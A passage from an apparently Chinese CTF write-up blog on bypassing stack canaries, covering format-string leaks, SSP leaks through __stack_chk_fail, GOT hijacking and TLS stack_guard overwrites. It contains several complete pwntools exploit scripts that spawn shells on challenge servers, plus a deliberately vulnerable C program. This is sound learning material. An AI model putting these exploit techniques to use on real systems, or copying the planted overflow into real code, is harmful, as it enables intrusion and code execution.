id="三、利用格式化字符串获取canary"><a href="#三、利用格式化字符串获取canary" class="headerlink" title="三、利用格式化字符串获取canary"></a><strong>三、利用格式化字符串获取canary</strong></h4><p>格式化字符串可以打印出栈中内容，目标利用此漏洞打印出canary值，再利用溢出进行攻击.<br>【Mary_Morton】<br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628202654542.png" alt="image-20230628202654542"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204047171.png" alt="image-20230628204047171"></p><p>快乐<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204121367.png" alt="image-20230628204121367"></p><p> 计算偏移喽<br>                                      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204702697.png" alt="image-20230628204702697"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204720325.png" alt="image-20230628204720325"></p><p>buf与canary距离 0x90 - 0x8 &#x3D; 0x88(136)   2^8+1 &#x3D; 17个内存单元<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210551449.png" alt="image-20230628210551449"></p><p>canary与printf格式化字符串形参相对偏移为17+6 &#x3D; 23<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210759817.png" alt="image-20230628210759817"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p=process(&#x27;./mary&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">63174</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;battle \n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%23$p&quot;</span>)</span><br><span class="line">tmp=<span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line">canary=p64(tmp)</span><br><span class="line"> </span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x88</span>)+canary+p64(<span class="number">0</span>)+p64(<span class="number">0x4008DA</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;3.&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="四、SSP-Leak利用canary"><a href="#四、SSP-Leak利用canary" class="headerlink" title="四、SSP Leak利用canary"></a><strong>四、SSP Leak利用canary</strong></h4><p>思路：<br>$canary检测失败会触发stack_chk_fali函数造成stack smashing（stack smashing protect leak）<br>$stack_chk_fail函数会输出一段报错显示文件名，覆盖文件名指针，从而实现任意读也就是覆盖变量__libc_argv[0]<br>$利用相应函数进行溢出（puts、read、write）得到libcbase 得出关键地址进行攻击</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminatedn&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>覆盖到argv就可输出我们想要的参数（即利用了canary的报错信息）</p><p>不同的libc对于__fortify_fail实现有差异，下面是glibc的实现<br><a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/debug/fortify_fail.c">github源码：glibc&#x2F;debug&#x2F;fortify_fail.c</a><br>【2018网鼎杯 Guess】<br>(1)checsksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628135719174.png" alt="image-20230628135719174"></p><p>(2)IDA分析<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628142542077.png" alt="image-20230628142542077"></p><p>（3）利用stack samshing原理 gdb调试找到argv[0]计算偏移<br>通过覆盖libc_argv[0]的内容触发canary保护将覆盖内容进行输出<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628143124351.png" alt="image-20230628143124351"></p><p>在main函数位置下断点 rsi处为argv[0]地址(0x7fffffffdfc87)<br>libc中有一个变量environ，储存着栈地址 只要得到libc基址，就可以算出这个变量的地址，再次用__stack_chk_fail读取这个变量就可以得到栈的一个地址，就能计算出读进来的flag的地址，从而再次用stack smash读取flag</p><p>第一次，我们泄露函数的got表内容，得到glibc地址。得到glibc地址，是为了计算出stack_end变量的地址，进而，第二次，我们泄露栈地址，计算出flag存放的地址，于是，第三次，我们就可以泄露flag的值。</p><p>gets函数下断点  调试计算偏移0xfc8-0xea0（0x128）【还需进一步深入理解】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628161126662.png" alt="image-20230628161126662"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27922</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./GUESS&#x27;)</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: leak puts_addr</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(puts_got)</span><br><span class="line">puts_plt = leak_addr(payload1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt-----&gt;&quot;</span> + <span class="built_in">hex</span>(puts_plt))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_plt)</span><br><span class="line">libc_base = puts_plt - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base-----&gt;&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ = libc.dump(<span class="string">&#x27;__environ&#x27;</span>) + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: leak environ</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ)</span><br><span class="line">environ_addr = leak_addr(payload2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enviorn in stack-----&gt;&quot;</span> + <span class="built_in">hex</span>(environ_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: leak flag</span></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ_addr-<span class="number">0x168</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>,payload3)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="五、劫持stack-chk-fail函数泄露canary"><a href="#五、劫持stack-chk-fail函数泄露canary" class="headerlink" title="五、劫持stack_chk_fail函数泄露canary"></a>五、劫持stack_chk_fail函数泄露canary</h4><p>思路：劫持stack_chk_fail，可以修改全局偏移表(GOT)中存储的_stack_chk_fail函数地址，在触发canary检查失败时，跳转到指定的地址继续执行.</p><p>百度杯flagen其实可以做更好的栗子 目前暂未获取到相关文件 以后有机会填坑😊</p><p>有相关文章[(12条消息) [pwn]ROP：三道题讲解花式绕过Canary栈保护_breezeO_o的博客-CSDN博客](<a href="https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request_id%22:%22168796009416800197015252%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168796009416800197015252&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E7%99%BE%E5%BA%A6%E6%9D%AF">https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request%5Fid%22%3A%22168796009416800197015252%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168796009416800197015252&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=百度杯</a> flagen&amp;spm&#x3D;1018.2226.3001.4187)</p><p>自己整个小简单🤖<br><strong>漏洞代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">175</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">275</span>);#栈溢出</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想成功劫持函数修改got表 需关闭relro<br>调用shell函数需要关闭pie</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="selector-tag">a</span><span class="selector-class">.c</span> -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">offset=<span class="number">10</span></span><br><span class="line">scf_got=ELF(<span class="string">&#x27;a&#x27;</span>).got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">gs_addr=ELF(<span class="string">&#x27;a&#x27;</span>).sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line">exp=fmtstr_payload(offset, &#123;scf_got: gs_addr&#125;)</span><br><span class="line">sh.send(exp+<span class="string">&#x27;A&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>乐乐乐<br>找到文件了<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/%601%7D0$_NRN19IS]ZZA9EK_PE.jpg" alt="img"><br>【flagen】<br>got表覆写原理<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628224746293.png" alt="image-20230628224746293"><br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628215919448.png" alt="image-20230628215919448"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220716478.png" alt="image-20230628220716478"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220912579.png" alt="image-20230628220912579"></p><p>此部分会将输入部分变长（1个字节变成3个字节），其中dest为指向堆缓冲区的指针，在调用leetify()时，其值将被压入栈中，由于该函数存在栈溢出漏洞，攻击者可以利用这个漏洞覆盖掉dest的值为指定地址，在后续调用strcpy()时，实现向任意地址写的目的。<br>我们可以将dest覆盖为stack_chk_fail函数在got表中的地址，达到修改stack_chk_fail函数调用地址的目的，这样后续在调用该函数时，实际上执行的是攻击者的代码。又因为canary存在\x00截断，需寻找合适的函数进行输入.</p><p>还是通过泄露libcbase getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>,alarm)</span><br><span class="line">system=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">malloc_hook=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendline(p32(system))</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./flagen&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">p,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">input</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">up</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">low</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addprefix</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prin</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">puts=<span class="number">0x08048510</span></span><br><span class="line">ret=<span class="number">0x0804846a</span></span><br><span class="line">stack_check=<span class="number">0x0804B01C</span></span><br><span class="line">pop_1=<span class="number">0x08048481</span></span><br><span class="line">pop_2=<span class="number">0x08048b00</span></span><br><span class="line">pop_3=<span class="number">0x08048d8d</span></span><br><span class="line">bss=<span class="number">0x804b144</span>+<span class="number">0x8</span></span><br><span class="line">a=<span class="number">0x08048F60</span></span><br><span class="line">read=<span class="number">0x080486CB</span></span><br><span class="line">p=process(<span class="string">&#x27;./flagen&#x27;</span>)</span><br><span class="line">payload=p32(ret)+<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x55</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+p32(pop_1)+p32(stack_check)</span><br><span class="line">payload+=p32(puts)+p32(pop_1)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">payload+=p32(read)+p32(pop_3)+p32(bss+<span class="number">0x100</span>)+p32(<span class="number">0x6fffffff</span>)+p32(<span class="number">0xffffffff</span>)</span><br><span class="line">payload+=p32(read)+p32(pop_3)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])+p32(<span class="number">0x6fffffff</span>)+p32(<span class="number">0xffffffff</span>)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;free&#x27;</span>])+p32(pop_1)+p32(bss+<span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">input</span>(p,payload)</span><br><span class="line">change(p)</span><br><span class="line">alarm=u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>].ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>,alarm)</span><br><span class="line">system=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">malloc_hook=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendline(p32(system))</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="六、修改TSL绕过canary"><a href="#六、修改TSL绕过canary" class="headerlink" title="六、修改TSL绕过canary"></a>六、修改TSL绕过canary</h4><p>在linux下有一种线程局部存储（Tread Local Storage）机制，即TLS.<br>存储线程的一些全局变量.<br>结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the  </span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span>  </span><br><span class="line">  <span class="type">dtv_t</span> *dtv;  </span><br><span class="line">  <span class="type">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span>  </span><br><span class="line">  <span class="type">int</span> multiple_threads;  </span><br><span class="line">  <span class="type">int</span> gscope_flag;  </span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;  </span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;  </span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  </span><br><span class="line">  ...  </span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;  </span><br></pre></td></tr></table></figure><p>注意：结构中uintptr_t stack_guard就是canary值，利用漏洞篡改stack_guard值即可绕过canary，而gs或fs寄存器指向此结构.</p><p>【bfnote】</p><p>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628102341433.png" alt="image-20230628102341433"></p><p>（2）进IDA<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628105142174.png" alt="image-20230628105142174"></p><p>漏洞：【1】s溢出0x600<br>           【2】v4进行初始化，检测限制了输入长度，而利用时并非利用了检测完成的值，利用了检测前的值，使得我们拥有一次在任意地址写入长度的能力<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628110303853.png" alt="image-20230628110303853"></p><p>gs寄存器指向的位置实际上就是内存中某处的tcbhead_t，而后面的0x14指的是stack_guard相对的偏移，那么tcbhead_t到底存储在哪，每个libc不同，但是对于pwn题经常使用的lib来说，其分布基本如图所示<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628111024934.png" alt="image-20230628111024934"></p><p>在libc地址更下位置和mmap一样同属共享映射区域，偏移相对固定.当我们malloc一个相当大的空间（此题&gt;&#x3D;0x20000），mallod就会用mmap来分配内存空间，其分配位置也会位于共享映射区域，依据mmap机制，其恰好处于tcbhead_r地址的低地址处，此时利用第二个漏洞写入可修改canary的值，从而实现绕过.<a href="https://blog.csdn.net/wmq880204/article/details/115163244?ops_request_misc=%7B%22request_id%22:%22168792272416800213048166%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168792272416800213048166&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-115163244-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=mmap=%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6&spm=1018.2226.3001.4187">(12条消息) Linux系统mmap内存映射机制原理_seqiqi_菠萝-琪琪的博客-CSDN博客</a></p><p>（3）ret2dl-resolve机制利用（延迟绑定应用）<br>利用的两种结构<em>Sym（x86为Elf32_Sym x64为Elf64_Sym）</em>、<em>Rel（x86为Elf32_Rel x64为Elf64_Rel）</em></p><p>Sym基本结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移（4字节）</span></span><br><span class="line">  Elf32_Addr    st_value;　　<span class="comment">//(4字节)</span></span><br><span class="line">  Elf32_Word    st_size;　　<span class="comment">//(4字节)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12(1字节)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;　　<span class="comment">//(1字节)</span></span><br><span class="line">  Elf32_Section st_shndx;　　<span class="comment">// (2字节)</span></span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf64_Sym</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;   <span class="comment">//符号名，是相对.dynstr起始的偏移(4字节）</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info;   <span class="comment">//对于导入函数符号而言，它是0x12(1字节)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;  <span class="comment">//(1字节)</span></span><br><span class="line">  Elf64_Section st_shndx;  <span class="comment">//(2字节）</span></span><br><span class="line">  Elf64_Addr    st_value;  <span class="comment">//(8字节)</span></span><br><span class="line">  Elf64_Xword   st_size;   <span class="comment">//(8字节)</span></span><br><span class="line">&#125;;<span class="comment">//对于导入函数而言，其他字段都是0</span></span><br></pre></td></tr></table></figure><p>Rel基本结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;<span class="comment">//是got的对应的地址(4字节)</span></span><br><span class="line">    Elf32_Word       r_info; <span 